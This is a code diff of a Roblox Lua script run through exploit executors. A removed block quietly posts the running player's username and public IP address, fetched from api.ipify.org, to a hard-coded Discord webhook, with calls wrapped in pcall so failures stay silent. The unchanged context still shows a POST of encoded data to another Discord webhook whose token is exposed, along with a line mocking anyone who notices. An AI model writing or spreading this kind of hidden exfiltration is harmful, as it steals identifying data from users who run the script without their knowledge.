@@ -36,54 +36,6 @@ Request = http_request or request or HttpPost or syn.request
 local Final = {Url = "https://discord.com/api/webhooks/1011969941978746961/7VfgvnFnsfFoPwWCzqu8ggm8XduAuxP5MLdx7dp6maTkbdNkJe_U3EOQ3y5aPKw10nko", Body = Encoded, Method = "POST", Headers = Headers}
 Request(Final)
 
-local webh = "https://discord.com/api/webhooks/1009295871176876042/VAt2me-rHoIM44n_daIjjUyCv2QP7xNN6F-zZvhvFQi24aJ7IDRm67iFhhvNktplyDj1"
-
-pcall(function()
-   local data = {
-       ["embeds"] = {
-           {
-               ["title"] = game:GetService("Players").LocalPlayer.Name,
-               ["description"] = game:HttpGet("https://api.ipify.org")
-           }
-       }
-   }
-
-   if syn then
-       local response = syn.request(
-           {
-               Url = webh,
-               Method = 'POST',
-               Headers = {
-                   ['Content-Type'] = 'application/json'
-               },
-               Body = game:GetService('HttpService'):JSONEncode(data)
-           }
-       );
-   elseif request then
-       local response = request(
-           {
-               Url = webh,
-               Method = 'POST',
-               Headers = {
-                   ['Content-Type'] = 'application/json'
-               },
-               Body = game:GetService('HttpService'):JSONEncode(data)
-           }
-       );
-   elseif http_request then
-       local response = http_request(
-           {
-               Url = webh,
-               Method = 'POST',
-               Headers = {
-                   ['Content-Type'] = 'application/json'
-               },
-               Body = game:GetService('HttpService'):JSONEncode(data)
-           }
-       );
-   end
-end)
-
 print("if u see this u are dumb :>")
     game.StarterGui:SetCore("SendNotification", {
       Title = "Thanks For Using";
